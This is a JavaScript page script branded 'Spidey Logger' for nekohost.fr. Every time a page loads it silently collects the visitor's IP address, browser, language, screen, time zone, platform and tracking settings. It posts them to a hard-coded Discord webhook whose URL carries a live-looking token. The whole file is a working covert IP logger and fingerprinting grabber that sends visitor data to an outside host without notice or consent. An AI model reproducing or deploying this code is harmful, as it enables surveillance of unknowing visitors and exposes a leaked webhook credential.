function sendDetailsToWebhook(details) {
    const webhookUrl = 'https://ptb.discord.com/api/webhooks/1257993219485077628/foypbWcAqqIUEzUgBYZd3K-fISh-TIvH8jNtL_-k3Vlhj0A2ZxCHGM1j_AXjsUo3GwH5';

    const params = {
        username: "Spidey Logger",
        avatar_url: "https://media.discordapp.net/attachments/1121574573075349625/1257995627837784094/1b1768d292a8af44b000c81d9cb36bfd.png?ex=66866f3a&is=66851dba&hm=36b0c4495132e85541460568f23ea514547630a63fcc88da13d758bfd321532c&=&format=webp&quality=lossless"
    };

    const data = {
        embeds: [{
            title: 'NekoHost',
            description: 'Details of the user accessing the page.',
            color: 0x000000,
            fields: [
                { name: 'IP Address', value: details.ip, inline: true },
                { name: 'User-Agent', value: details.userAgent, inline: true },
                { name: 'Language', value: details.language, inline: true },
                { name: 'Screen Resolution', value: `${details.screenWidth}x${details.screenHeight}`, inline: true },
                { name: 'Color Depth', value: `${details.colorDepth} bits`, inline: true },
                { name: 'Time Zone', value: details.timeZone, inline: true },
                { name: 'Platform', value: details.platform, inline: true },
                { name: 'Cookies Enabled', value: details.cookiesEnabled, inline: true },
                { name: 'Do Not Track', value: details.doNotTrack, inline: true }
            ],
            footer: {
                text: 'Page accessed from nekohost.fr'
            },
            timestamp: new Date()
        }]
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
    })
    .catch(error => {
        console.error('Error:', error);
    });
}

function getUserDetails() {
    const ipFetch = fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip)
        .catch(error => {
            console.error('Error getting IP:', error);
            return 'N/A';
        });

    const details = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        screenWidth: screen.width,
        screenHeight: screen.height,
        colorDepth: screen.colorDepth,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
        doNotTrack: navigator.doNotTrack || 'Not enabled'
    };

    return ipFetch.then(ip => {
        return { ip, ...details };
    });
}

getUserDetails().then(details => {
    sendDetailsToWebhook(details);
});
